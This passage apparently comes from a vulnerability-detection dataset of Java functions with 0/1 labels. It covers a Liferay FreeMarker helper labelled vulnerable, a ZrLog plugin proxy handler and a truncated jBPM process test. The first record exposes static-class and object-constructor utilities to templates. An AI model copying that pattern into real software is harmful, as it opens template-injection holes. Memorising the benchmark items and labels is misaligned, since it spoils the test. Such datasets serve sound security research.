BeansWrapper.getDefaultInstance().getEnumModels());\n\n\t\t// Object util\n\n\t\thelperUtilities.put(\"objectUtil\", new ObjectConstructor());\n\n\t\t// Portlet preferences\n\n\t\thelperUtilities.put(\n\t\t\t\"freeMarkerPortletPreferences\", new TemplatePortletPreferences());\n\n\t\t// Static class util\n\n\t\thelperUtilities.put(\n\t\t\t\"staticUtil\", BeansWrapper.getDefaultInstance().getStaticModels());\n\n\t\treturn helperUtilities;\n\t}\n\n\t@Override\n\tpublic Set<String> getRestrictedVariables() {\n\t\treturn SetUtil.fromArray(\n\t\t\tPropsValues.JOURNAL_TEMPLATE_FREEMARKER_RESTRICTED_VARIABLES);\n\t}\n\n\t@Override\n\tpublic void prepare(\n\t\tTemplateContext templateContext, HttpServletRequest request) {\n\n\t\tsuper.prepare(templateContext, request);\n\n\t\t// Theme display\n\n\t\tThemeDisplay themeDisplay = (ThemeDisplay)request.getAttribute(\n\t\t\tWebKeys.THEME_DISPLAY);\n\n\t\tif (themeDisplay != null) {\n\t\t\tTheme theme = themeDisplay.getTheme();\n\n\t\t\t// Full css and templates path\n\n\t\t\tString servletContextName = GetterUtil.getString(\n\t\t\t\ttheme.getServletContextName());\n\n\t\t\ttemplateContext.put(\n\t\t\t\t\"fullCssPath\",\n\t\t\t\tStringPool.SLASH + servletContextName +\n\t\t\t\t\ttheme.getFreeMarkerTemplateLoader() + theme.getCssPath());\n\n\t\t\ttemplateContext.put(\n\t\t\t\t\"fullTemplatesPath\",\n\t\t\t\tStringPool.SLASH + servletContextName +\n\t\t\t\t\ttheme.getFreeMarkerTemplateLoader() +\n\t\t\t\t\t\ttheme.getTemplatesPath());\n\n\t\t\t// Init\n\n\t\t\ttemplateContext.put(\n\t\t\t\t\"init\",\n\t\t\t\tStringPool.SLASH + themeDisplay.getPathContext() +\n\t\t\t\t\tFreeMarkerTemplateLoader.SERVLET_SEPARATOR +\n\t\t\t\t\t\t\"/html/themes/_unstyled/templates/init.ftl\");\n\t\t}\n\n\t\t// Insert custom ftl variables\n\n\t\tMap<String, Object> ftlVariables =\n\t\t\t(Map<String, Object>)request.getAttribute(WebKeys.FTL_VARIABLES);\n\n\t\tif (ftlVariables != null) {\n\t\t\tfor (Map.Entry<String, Object> entry : ftlVariables.entrySet()) {\n\t\t\t\tString key = entry.getKey();\n\t\t\t\tObject value = entry.getValue();\n\n\t\t\t\tif (Validator.isNotNull(key)) {\n\t\t\t\t\ttemplateContext.put(key, value);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n}", "target": 1}
{"idx": 1038, "func": "package com.zrlog.web.handler;\n\nimport com.hibegin.common.util.IOUtil;\nimport com.hibegin.common.util.http.HttpUtil;\nimport com.hibegin.common.util.http.handle.CloseResponseHandle;\nimport com.jfinal.core.JFinal;\nimport com.jfinal.handler.Handler;\nimport com.zrlog.common.Constants;\nimport com.zrlog.common.vo.AdminTokenVO;\nimport com.zrlog.model.User;\nimport com.zrlog.service.AdminTokenService;\nimport com.zrlog.service.AdminTokenThreadLocal;\nimport com.zrlog.util.BlogBuildInfoUtil;\nimport com.zrlog.web.util.PluginHelper;\nimport org.apache.http.Header;\nimport org.apache.http.client.methods.CloseableHttpResponse;\nimport org.apache.log4j.Logger;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * 这个类负责了对所有的插件路由的代理中转给插件服务（及plugin-core.jar这个进程），使用的是Handler而非Interception也是由于Interception\n * 不处理静态请求。\n * 目前插件服务拦截了\n * 1./admin/plugins/* （进行权限检查）\n * 2./plugin/* /p/* （是plugin的短路由，代码逻辑上是不区分的，不检查权限）\n * <p>\n * 如果想了解更多关于插件的实现可以浏览这篇文章 http://blog.zrlog.com/post/zrlog-plugin-dev\n */\npublic class PluginHandler extends Handler {\n\n    private static final Logger LOGGER = Logger.getLogger(PluginHandler.class);\n\n    private AdminTokenService adminTokenService = new AdminTokenService();\n\n    private List<String> pluginHandlerPaths = Arrays.asList(\"/admin/plugins/\", \"/plugin/\", \"/p/\");\n\n    @Override\n    public void handle(String target, HttpServletRequest request, HttpServletResponse response, boolean[] isHandled) {\n        //便于Wappalyzer读取\n        response.addHeader(\"X-ZrLog\", BlogBuildInfoUtil.getVersion());\n        boolean isPluginPath = false;\n        for (String path : pluginHandlerPaths) {\n            if (target.startsWith(path)) {\n                isPluginPath = true;\n            }\n        }\n        if (isPluginPath) {\n            Map.Entry<AdminTokenVO, User> entry = null;\n            try {\n                entry = adminTokenService.getAdminTokenVOUserEntry(request);\n                if (entry != null) {\n                    adminTokenService.setAdminToken(entry.getValue(), entry.getKey().getSessionId(), entry.getKey().getProtocol(), request, response);\n                }\n                if (target.startsWith(\"/admin/plugins/\")) {\n                    try {\n                        adminPermission(target, request, response);\n                    } catch (IOException | InstantiationException e) {\n                        LOGGER.error(e);\n                    }\n                } else if (target.startsWith(\"/plugin/\") || target.startsWith(\"/p/\")) {\n                    try {\n                        visitorPermission(target, request, response);\n                    } catch (IOException | InstantiationException e) {\n                        LOGGER.error(e);\n                    }\n                }\n            } finally {\n                isHandled[0] = true;\n                if (entry != null) {\n                    AdminTokenThreadLocal.remove();\n                }\n            }\n        } else {\n            this.next.handle(target, request, response, isHandled);\n        }\n    }\n\n    /**\n     * 检查是否登陆，未登陆的请求直接放回403的错误页面\n     *\n     * @param target\n     * @param request\n     * @param response\n     * @throws IOException\n     * @throws InstantiationException\n     */\n    private void adminPermission(String target, HttpServletRequest request, HttpServletResponse response) throws IOException, InstantiationException {\n        if (AdminTokenThreadLocal.getUser() != null) {\n            accessPlugin(target.replace(\"/admin/plugins\", \"\"), request, response);\n        } else {\n            response.sendRedirect(request.getContextPath()\n                    + \"/admin/login?redirectFrom=\"\n                    + request.getRequestURL() + (request.getQueryString() != null ? \"?\" + request.getQueryString() : \"\"));\n        }\n    }\n\n    /**\n     * 不检查是否登陆，错误请求直接直接转化为403\n     *\n     * @param target\n     * @param request\n     * @param response\n     * @throws IOException\n     * @throws InstantiationException\n     */\n    private void visitorPermission(String target, HttpServletRequest request, HttpServletResponse response) throws IOException, InstantiationException {\n        if (!accessPlugin(target.replace(\"/plugin\", \"\").replace(\"/p\", \"\"), request, response)) {\n            response.sendError(403);\n        }\n    }\n\n    /**\n     * 代理中转HTTP请求，目前仅支持，GET，POST 请求方式的中转。\n     *\n     * @param uri\n     * @param request\n     * @param response\n     * @return true 表示请求正常执行，false 代表遇到了一些问题\n     * @throws IOException\n     * @throws InstantiationException\n     */\n    private boolean accessPlugin(String uri, HttpServletRequest request, HttpServletResponse response) throws IOException, InstantiationException {\n        CloseResponseHandle handle = getContext(uri, request.getMethod(), request, true);\n        try {\n            if (handle.getT() != null && handle.getT().getEntity() != null) {\n                response.setStatus(handle.getT().getStatusLine().getStatusCode());\n                //防止多次被Transfer-Encoding\n                handle.getT().removeHeaders(\"Transfer-Encoding\");\n                for (Header header : handle.getT().getAllHeaders()) {\n                    response.addHeader(header.getName(), header.getValue());\n                }\n                //将插件服务的HTTP的body返回给调用者\n                byte[] bytes = IOUtil.getByteByInputStream(handle.getT().getEntity().getContent());\n                response.addHeader(\"Content-Length\", Integer.valueOf(bytes.length).toString());\n                response.getOutputStream().write(bytes);\n                response.getOutputStream().close();\n                return true;\n            } else {\n                return false;\n            }\n        } finally {\n            handle.close();\n        }\n    }\n\n    public static CloseResponseHandle getContext(String uri, String method, HttpServletRequest request, boolean disableRedirect) throws IOException, InstantiationException {\n        String pluginServerHttp = Constants.pluginServer;\n        CloseableHttpResponse httpResponse;\n        CloseResponseHandle handle = new CloseResponseHandle();\n        HttpUtil httpUtil = disableRedirect ? HttpUtil.getDisableRedirectInstance() : HttpUtil.getInstance();\n        //GET请求不关心request.getInputStream() 的数据\n        if (method.equals(request.getMethod()) && \"GET\".equalsIgnoreCase(method)) {\n            httpResponse = httpUtil.sendGetRequest(pluginServerHttp + uri, request.getParameterMap(), handle, PluginHelper.genHeaderMapByRequest(request, AdminTokenThreadLocal.getUser())).getT();\n        } else {\n            //如果是表单数据提交不关心请求头，反之将所有请求头都发到插件服务\n            if (\"application/x-www-form-urlencoded\".equals(request.getContentType())) {\n                httpResponse = httpUtil.sendPostRequest(pluginServerHttp + uri, request.getParameterMap(), handle, PluginHelper.genHeaderMapByRequest(request, AdminTokenThreadLocal.getUser())).getT();\n            } else {\n                httpResponse = httpUtil.sendPostRequest(pluginServerHttp + uri + \"?\" + request.getQueryString(), IOUtil.getByteByInputStream(request.getInputStream()), handle, PluginHelper.genHeaderMapByRequest(request, AdminTokenThreadLocal.getUser())).getT();\n            }\n        }\n        //添加插件服务的HTTP响应头到调用者响应头里面\n        if (httpResponse != null) {\n            Map<String, String> headerMap = new HashMap<>();\n            Header[] headers = httpResponse.getAllHeaders();\n            for (Header header : headers) {\n                headerMap.put(header.getName(), header.getValue());\n            }\n            if (JFinal.me().getConstants().getDevMode()) {\n                LOGGER.info(uri + \" --------------------------------- response\");\n            }\n            for (Map.Entry<String, String> t : headerMap.entrySet()) {\n                if (JFinal.me().getConstants().getDevMode()) {\n                    LOGGER.info(\"key \" + t.getKey() + \" value-> \" + t.getValue());\n                }\n            }\n        }\n        return handle;\n    }\n}\n", "target": 0}
{"idx": 1039, "func": "/**\n * Copyright 2010 JBoss Inc\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.jbpm.bpmn2;\n\nimport java.io.ByteArrayInputStream;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collection;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\nimport javax.xml.parsers.DocumentBuilderFactory;\n\nimport org.jbpm.bpmn2.handler.ReceiveTaskHandler;\nimport org.jbpm.bpmn2.handler.SendTaskHandler;\nimport org.jbpm.bpmn2.handler.ServiceTaskHandler;\nimport org.jbpm.bpmn2.handler.SignallingTaskHandlerDecorator;\nimport org.jbpm.bpmn2.objects.ExceptionService;\nimport org.jbpm.bpmn2.objects.Person;\nimport org.jbpm.bpmn2.objects.TestWorkItemHandler;\nimport org.jbpm.process.audit.JPAAuditLogService;\nimport org.jbpm.process.audit.VariableInstanceLog;\nimport org.jbpm.process.instance.impl.demo.DoNothingWorkItemHandler;\nimport org.jbpm.process.instance.impl.demo.SystemOutWorkItemHandler;\nimport org.junit.After;\nimport org.junit.BeforeClass;\nimport org.junit.Ignore;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.junit.runners.Parameterized;\nimport org.junit.runners.Parameterized.Parameters;\nimport org.kie.api.KieBase;\nimport org.kie.api.event.process.DefaultProcessEventListener;\nimport org.kie.api.event.process.ProcessStartedEvent;\nimport org.kie.api.io.ResourceType;\nimport org.kie.api.runtime.KieSession;\nimport org.kie.api.runtime.process.ProcessInstance;\nimport org.kie.api.runtime.process.WorkItem;\nimport org.kie.api.runtime.process.WorkflowProcessInstance;\nimport org.kie.internal.KnowledgeBase;\nimport org.kie.internal.KnowledgeBaseFactory;\nimport org.kie.internal.builder.KnowledgeBuilder;\nimport org.kie.internal.builder.KnowledgeBuilderError;\nimport org.kie.internal.builder.KnowledgeBuilderFactory;\nimport org.kie.internal.io.ResourceFactory;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.w3c.dom.Document;\n\n@RunWith(Parameterized.class)\npublic class StandaloneBPMNProcessTest extends JbpmBpmn2TestCase {\n\n    private static final Logger logger = LoggerFactory.getLogger(StandaloneBPMNProcessTest.class);\n    \n    @Parameters\n    public static Collection<Object[]> persistence() {\n        Object[][] data = new Object[][] { \n                { false, false }, \n                { true, false }, \n                { true, true } \n                };\n        return Arrays.asList(data);\n    };\n    \n    public StandaloneBPMNProcessTest(boolean persistence, boolean locking) {\n        super(persistence, locking);\n    }\n\n    @BeforeClass\n    public static void setup() throws Exception {\n        setUpDataSource();\n    }\n    \n    @After\n    public void tearDown() {\n        KnowledgeBaseFactory.setKnowledgeBaseServiceFactory(null);\n    }\n\n    /**\n     * Tests\n     */\n    \n    @Test\n    public void testMinimalProcess() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-MinimalProcess.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ProcessInstance processInstance = ksession.startProcess(\"Minimal\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testMinimalProcessWithGraphical() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-MinimalProcessWithGraphical.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ProcessInstance processInstance = ksession.startProcess(\"Minimal\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testMinimalProcessWithDIGraphical() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-MinimalProcessWithDIGraphical.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ProcessInstance processInstance = ksession.startProcess(\"Minimal\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testCompositeProcessWithDIGraphical() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-CompositeProcessWithDIGraphical.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ProcessInstance processInstance = ksession.startProcess(\"Composite\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testScriptTask() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-ScriptTask.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ProcessInstance processInstance = ksession.startProcess(\"ScriptTask\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testDataObject() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-DataObject.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"employee\", \"UserId-12345\");\n        ProcessInstance processInstance = ksession.startProcess(\"Evaluation\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testEvaluationProcess() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-EvaluationProcess.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"RegisterRequest\", new SystemOutWorkItemHandler());\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"employee\", \"UserId-12345\");\n        ProcessInstance processInstance = ksession.startProcess(\"Evaluation\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testEvaluationProcess2() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-EvaluationProcess2.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", new SystemOutWorkItemHandler());\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"employee\", \"UserId-12345\");\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.evaluation\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testEvaluationProcess3() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-EvaluationProcess3.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        \n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"RegisterRequest\", new SystemOutWorkItemHandler());\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"employee\", \"john2\");\n        ProcessInstance processInstance = ksession.startProcess(\"Evaluation\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testUserTask() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-UserTask.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        TestWorkItemHandler workItemHandler = new TestWorkItemHandler();\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        \n        Map<String, Object> params = new HashMap<String, Object>();\n        String varId = \"s\";\n        String varValue = \"initialValue\";\n        params.put(varId, varValue);\n        ProcessInstance processInstance = ksession.startProcess(\"UserTask\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        \n        // Test jbpm-audit findVariableInstancesByName* methods\n        if( isPersistence() ) { \n            List<VariableInstanceLog> varLogs = logService.findVariableInstancesByName(varId, true);\n            assertTrue( ! varLogs.isEmpty() );\n            for( VariableInstanceLog varLog : varLogs ) { \n                assertEquals( varId, varLog.getVariableId());\n            }\n            varLogs = logService.findVariableInstancesByNameAndValue( varId, varValue, true);\n            assertTrue( ! varLogs.isEmpty() );\n            for( VariableInstanceLog varLog : varLogs ) { \n                assertEquals( varId, varLog.getVariableId());\n                assertEquals( varValue, varLog.getValue() );\n            }\n        }\n        \n        ksession = restoreSession(ksession, true);\n        WorkItem workItem = workItemHandler.getWorkItem();\n        assertNotNull(workItem);\n        assertEquals(\"john\", workItem.getParameter(\"ActorId\"));\n        ksession.getWorkItemManager().completeWorkItem(workItem.getId(), null);\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testLane() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-Lane.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        TestWorkItemHandler workItemHandler = new TestWorkItemHandler();\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        ProcessInstance processInstance = ksession.startProcess(\"UserTask\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        WorkItem workItem = workItemHandler.getWorkItem();\n        assertNotNull(workItem);\n        assertEquals(\"john\", workItem.getParameter(\"ActorId\"));\n        Map<String, Object> results = new HashMap<String, Object>();\n        results.put(\"ActorId\", \"mary\");\n        ksession.getWorkItemManager().completeWorkItem(workItem.getId(), results);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Human Task\", workItemHandler);\n        workItem = workItemHandler.getWorkItem();\n        assertNotNull(workItem);\n        assertEquals(\"mary\", workItem.getParameter(\"SwimlaneActorId\"));\n        ksession.getWorkItemManager().completeWorkItem(workItem.getId(), null);\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testExclusiveSplit() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-ExclusiveSplit.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email\", new SystemOutWorkItemHandler());\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"x\", \"First\");\n        params.put(\"y\", \"Second\");\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testExclusiveSplitDefault() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-ExclusiveSplitDefault.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email\", new SystemOutWorkItemHandler());\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"x\", \"NotFirst\");\n        params.put(\"y\", \"Second\");\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testInclusiveSplit() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-InclusiveSplit.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"x\", 15);\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testInclusiveSplitDefault() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-InclusiveSplitDefault.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"x\", -5);\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    @Ignore\n    public void testExclusiveSplitXPath() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-ExclusiveSplitXPath.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        \n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email\", new SystemOutWorkItemHandler());\n        Document document = DocumentBuilderFactory\n                .newInstance()\n                .newDocumentBuilder()\n                .parse(new ByteArrayInputStream(\n                        \"<myDocument><chapter1>BlaBla</chapter1><chapter2>MoreBlaBla</chapter2></myDocument>\".getBytes()));\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"x\", document);\n        params.put(\"y\", \"SomeString\");\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\", params);\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_COMPLETED);\n    }\n\n    @Test\n    public void testEventBasedSplit() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-EventBasedSplit.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        // Yes\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        ksession.signalEvent(\"Yes\", \"YesValue\", processInstance.getId());\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n        // No\n        processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        ksession.signalEvent(\"No\", \"NoValue\", processInstance.getId());\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void testEventBasedSplitBefore() throws Exception {\n        // signaling before the split is reached should have no effect\n        KieBase kbase = createKnowledgeBase(\"BPMN2-EventBasedSplit.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new DoNothingWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new DoNothingWorkItemHandler());\n        // Yes\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new DoNothingWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new DoNothingWorkItemHandler());\n        ksession.signalEvent(\"Yes\", \"YesValue\", processInstance.getId());\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        // No\n        processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new DoNothingWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new DoNothingWorkItemHandler());\n        ksession.signalEvent(\"No\", \"NoValue\", processInstance.getId());\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n    }\n\n    @Test\n    public void testEventBasedSplitAfter() throws Exception {\n        // signaling the other alternative after one has been selected should\n        // have no effect\n        KieBase kbase = createKnowledgeBase(\"BPMN2-EventBasedSplit.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new DoNothingWorkItemHandler());\n        // Yes\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new DoNothingWorkItemHandler());\n        ksession.signalEvent(\"Yes\", \"YesValue\", processInstance.getId());\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new DoNothingWorkItemHandler());\n        // No\n        ksession.signalEvent(\"No\", \"NoValue\", processInstance.getId());\n    }\n\n    @Test\n    public void testEventBasedSplit2() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-EventBasedSplit2.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        // Yes\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        ksession.signalEvent(\"Yes\", \"YesValue\", processInstance.getId());\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n        Thread.sleep(800);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        // Timer\n        processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        Thread.sleep(800);\n        ksession = restoreSession(ksession, true);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    @Ignore(\"process does not complete\")\n    public void testEventBasedSplit3() throws Exception {\n        KieBase kbase = createKnowledgeBase(\"BPMN2-EventBasedSplit3.bpmn2\");\n        KieSession ksession = createKnowledgeSession(kbase);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        Person jack = new Person();\n        jack.setName(\"Jack\");\n        // Yes\n        ProcessInstance processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        ksession.signalEvent(\"Yes\", \"YesValue\", processInstance.getId());\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n        // Condition\n        processInstance = ksession.startProcess(\"com.sample.test\");\n        assertTrue(processInstance.getState() == ProcessInstance.STATE_ACTIVE);\n        ksession = restoreSession(ksession);\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email1\", new SystemOutWorkItemHandler());\n        ksession.getWorkItemManager().registerWorkItemHandler(\"Email2\", new SystemOutWorkItemHandler());\n        ksession.insert(jack);\n        assertProcessInstanceCompleted(processInstance.getId(), ksession);\n    }\n\n    @Test\n    public void 